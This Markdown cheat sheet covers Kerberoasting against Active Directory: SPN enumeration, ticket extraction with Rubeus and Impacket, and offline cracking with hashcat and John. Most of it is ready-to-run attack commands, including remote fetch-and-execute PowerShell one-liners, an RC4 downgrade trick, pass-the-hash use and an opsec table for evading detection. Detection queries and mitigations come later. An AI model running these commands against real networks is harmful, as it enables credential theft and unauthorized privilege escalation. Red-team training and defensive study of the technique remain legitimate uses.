---
title: "Kerberoasting"
description: "Request and crack SPN service tickets: GetUserSPNs, Rubeus, hashcat modes and mitigation notes."
category: active-directory
tags: [active-directory, kerberos, cracking]
tools: [Impacket, Rubeus, Hashcat]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:ActiveDirectory/Kerberos/Kerberoasting Cheatsheet.md"
---

# Kerberoasting

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | **Requires:** Valid domain user credentials

---

## How It Works

1. Attacker enumerates AD accounts with **Service Principal Names (SPNs)** set
2. Requests a **TGS (Ticket Granting Service)** ticket for the SPN from the KDC
3. The KDC issues a ticket **encrypted with the service account's NTLM password hash**
4. Ticket is extracted and taken **offline for cracking**
5. Plaintext password recovered → lateral movement / privilege escalation

> **Note —** No special privileges required — any valid domain user can request TGS tickets.

---

## Phase 1 — SPN Enumeration

### Windows (Native / Living off the Land)
```cmd
:: List all SPNs in the domain
setspn -T DOMAIN.LOCAL -Q */*

:: Filter for user accounts (not machine accounts)
setspn -T DOMAIN.LOCAL -Q */* | findstr -v "CN=Computers"
```

### Windows (PowerView / PowerSploit)
```powershell
# Load PowerView
iex(new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

# Get users with SPNs set
Get-DomainUser -SPN | Select SamAccountName, DisplayName, ServicePrincipalName

# Shorthand
Get-NetUser -SPN
```

### Linux (Impacket)
```bash
# Enumerate SPNs only (no ticket request)
GetUserSPNs.py DOMAIN.LOCAL/user:password -dc-ip <DC_IP>
```

---

## Phase 2 — TGS Ticket Extraction

### Rubeus (Windows) — Recommended
```powershell
# Roast all kerberoastable users
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Output in Hashcat format
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Target a specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# Target users in a specific OU
.\Rubeus.exe kerberoast /ou:"OU=Services,DC=domain,DC=local" /outfile:hashes.txt

# Stats only (no ticket requests — stealthy recon)
.\Rubeus.exe kerberoast /stats

# Force RC4 downgrade via tgtdeleg trick (easier to crack)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt /nowrap

# Roast across a trusted domain
.\Rubeus.exe kerberoast /domain:dev.corp.local /nowrap

# Filter by password age (target stale accounts)
.\Rubeus.exe kerberoast /tgtdeleg /pwdsetbefore:01-01-2021 /resultlimit:5
```

### Impacket — GetUserSPNs.py (Linux/Remote)
```bash
# Enumerate and request all TGS hashes
GetUserSPNs.py DOMAIN/user:password -dc-ip <DC_IP> -request

# Save hashes to file
GetUserSPNs.py DOMAIN/user:password -dc-ip <DC_IP> -request -outputfile hashes.txt

# Authenticate with NT hash (Pass-the-Hash)
GetUserSPNs.py -hashes 'LMhash:NThash' DOMAIN/user -dc-ip <DC_IP> -request

# Kerberoast without pre-authentication (AS-REP style)
GetUserSPNs.py -no-preauth bobby -usersfile spn_users.txt -dc-host <DC_IP> DOMAIN.LOCAL/

# Cross-domain / across trusts
GetUserSPNs.py DOMAIN/user:password -dc-ip <DC_IP> -target-domain trusted.local -request
```

> **Note —** NetExec can also roast in one shot: `nxc ldap <DC_IP> -u user -p password --kerberoasting hashes.txt`.

### Invoke-Kerberoast (PowerShell)
```powershell
# Load and execute
iex(new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

# Dump hashes in Hashcat format
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath hashes.txt -Encoding ASCII

# Target a specific domain
Invoke-Kerberoast -Domain dev.corp.local | fl

# Use alternate credentials
$SecPass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPass)
Invoke-Kerberoast -Credential $Cred | fl
```

### Pure .NET / In-Memory (No Tools on Disk)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.domain.local:1433"

# Then export with Mimikatz
kerberos::list /export
```

---

## Phase 3 — Offline Hash Cracking

### Hash Format Reference

| Tool | Hash Prefix | Mode |
|---|---|---|
| Hashcat | `$krb5tgs$23$` (RC4) | `13100` |
| Hashcat | `$krb5tgs$17$` (AES-128) | `19600` |
| Hashcat | `$krb5tgs$18$` (AES-256) | `19700` |
| John the Ripper | `$krb5tgs$` | `krb5tgs` |

### Hashcat
```bash
# RC4 (type 23) — fastest to crack
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AES-128 (type 17)
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 (type 18)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (recommended)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force mask (uppercase + lowercase + digits, 8 chars)
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?d?d?d
```

### John the Ripper
```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=krb5tgs hashes.txt --show
```

---

## Opsec / Evasion Tips

| Technique | Risk Level | Notes |
|---|---|---|
| Default Rubeus `kerberoast` | Medium | Uses `KerberosRequestorSecurityToken` — visible in logs |
| `/tgtdeleg` flag | Medium-High | Forces RC4; triggers etype 0x17 in Event 4769 |
| Slow/staggered requests | Low | Avoid bulk TGS requests; blend into normal traffic |
| Target single account | Low | `/user:target` reduces noise vs. bulk roasting |
| `/stats` flag first | Very Low | Only enumerates — no ticket requests made |
| LDAP-based enumeration only | Low | Recon without touching the KDC |

---

## Detection

### Key Windows Event IDs

| Event ID | Description | Indicator |
|---|---|---|
| `4769` | Kerberos TGS ticket requested | Encryption type `0x17` (RC4) is suspicious |
| `4770` | Kerberos TGS ticket renewed | Bulk renewals may indicate automation |
| `4768` | Kerberos TGT requested | Baseline for user auth |

### SIEM / Splunk Query Logic
```text
EventCode=4769
AND TicketEncryptionType=0x17
AND NOT AccountName="*$"   # Exclude machine accounts
AND ServiceName != "krbtgt"
AND ServiceName != "*$"
```

Look for:
* A **single user requesting tickets for many SPNs** in a short window
* TGS requests with **RC4 encryption (0x17)** from accounts that normally use AES
* Requests originating from **unusual hosts** or **off-hours**
* Any access to **honeytoken/canary SPN accounts**

### Microsoft Defender XDR
Alert **External ID 2410** — *Suspected Kerberos SPN Exposure* ([Source](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/))

---

## Mitigation

| Control | Description |
|---|---|
| **Use gMSA / dMSA** | Group/Delegated Managed Service Accounts auto-rotate 120+ char passwords — infeasible to crack |
| **Strong SPN passwords** | Minimum 25+ char random passwords for service accounts with SPNs |
| **Enforce AES encryption** | Set `msDS-SupportedEncryptionTypes` to AES only; disable RC4 (NTLM hash not used for AES keys) |
| **Least Privilege** | Service accounts with SPNs should have minimal AD rights — never Domain Admin |
| **Password rotation** | Rotate SPN account passwords every 30–90 days minimum |
| **Audit SPNs regularly** | Remove unnecessary or orphaned SPNs from user accounts |
| **Honeypot SPNs** | Deploy canary service accounts — any TGS request = immediate alert |
| **Disable RC4 where possible** | Reduces crackability of any tickets that are exfiltrated |
| **MFA on privileged accounts** | Limits blast radius even if hash is cracked |

---

## Related Attacks

* **AS-REP Roasting** (T1558.004) — targets accounts with pre-auth disabled; no credentials needed
* **Silver Ticket** — forge TGS tickets using cracked service account hash
* **Golden Ticket** — forge TGTs using `krbtgt` hash
* **Pass-the-Ticket** — reuse captured TGS tickets without cracking
* **Golden gMSA** — attack against gMSA `KDS Root Key` when gMSAs replace kerberoastable accounts

---

## Tools Reference

| Tool | Platform | Use |
|---|---|---|
| [Rubeus](https://github.com/GhostPack/Rubeus) | Windows | Full-featured C# Kerberos toolset |
| [Impacket GetUserSPNs.py](https://github.com/fortra/impacket) | Linux | Remote roasting with creds or hashes |
| [PowerView / Invoke-Kerberoast](https://github.com/PowerShellMafia/PowerSploit) | Windows (PS) | PowerShell-based enumeration + roasting |
| [Hashcat](https://hashcat.net) | Any | GPU-accelerated hash cracking |
| [John the Ripper](https://www.openwall.com/john/) | Any | CPU-based hash cracking |
| [BloodHound](https://github.com/SpecterOps/BloodHound) | Any | Visualise kerberoastable paths to DA |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows | Export tickets from memory |
